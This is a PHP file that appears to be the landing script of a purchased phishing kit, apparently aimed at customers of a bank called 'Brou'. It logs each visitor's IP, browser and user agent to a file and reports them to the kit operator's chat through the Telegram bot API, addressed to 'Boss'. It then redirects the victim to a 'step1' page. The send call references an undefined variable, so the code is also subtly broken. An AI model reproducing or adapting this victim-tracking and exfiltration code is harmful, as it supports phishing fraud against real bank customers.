<?php 

session_start();
require('func.php');
require('edit.php');
$useragent=$_SERVER['HTTP_USER_AGENT'];
$ip = getIp();
$timeNow = date("Y-m-d H:i:s");
$VisitText = $timeNow ."|".$ip."\n";
$browser = getBrowser();





$_SESSION['logID'] = time().md5(uniqid(rand(), true));
$logID = $_SESSION['logID'];
$visits = fopen("visitors.txt","a+");
fwrite($visits,"$VisitText");
fclose($visits);
$resultMsg =  "|Hey Boss, New VISIT ON Brou  \n";
$resultMsg .= "|IP: $ip \n";
$resultMsg .= "|Browser: $browser \n";
$resultMsg .= "|DB: https://db-ip.com/$ip \n";
$resultMsg .= "|UA: $useragent \n";
$resultMsg .= "|Result ID:  #$logID \n";
$resultMsg .= "|Thanks For buying \n";
 $url = "https://api.telegram.org/bot$tokenBot_visitors/sendMessage?chat_id=".$chatid."&text=" . urlencode($msg).""; 
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_URL, $url); 
    $result = curl_exec($ch); 


header("Location: step1");exit();



?>



